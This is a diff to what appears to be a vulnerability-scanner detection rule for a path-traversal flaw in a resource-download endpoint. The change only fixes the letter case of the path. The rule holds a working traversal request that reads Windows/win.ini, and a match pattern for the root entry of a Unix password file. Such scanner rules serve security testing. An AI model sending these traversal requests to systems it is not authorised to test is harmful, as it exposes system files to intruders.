@@ -7,7 +7,7 @@ groups:
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
   windows:
     - method: GET
-      path: /Common/download/resource?resource=/profile/../../../../Windows/win.ini
+      path: /common/download/resource?resource=/profile/../../../../Windows/win.ini
       expression: |
         response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 detail:
